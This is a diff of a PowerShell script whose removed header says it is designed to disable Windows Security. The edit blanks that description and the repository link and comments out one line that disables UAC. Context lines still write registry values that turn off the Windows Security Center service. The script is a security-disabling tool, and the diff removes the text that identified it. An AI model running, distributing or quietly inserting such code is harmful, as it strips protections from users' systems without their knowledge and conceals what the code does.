@@ -1,10 +1,10 @@
 <#
 .SYNOPSIS
-    This script is designed to disable Window Security.
+  
 .NOTES
-    This script was NOT optimized to shorten and obfuscate the code but rather intended to have as much readability as possible for new coders to learn!
+    
 .LINK
-    https://github.com/isPique/Fuck-Windows-Security
+    
 #>
 
 # Ignore errors
@@ -418,7 +418,7 @@ Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Po
 Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -properties @{"fDenyTSConnections" = 1}
 
 # Disable User Account Control (UAC)
-Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"EnableLUA" = 0}
+# Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"EnableLUA" = 0}
 
 # Disable Windows Security Center
 Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -properties @{"Start" = 4}
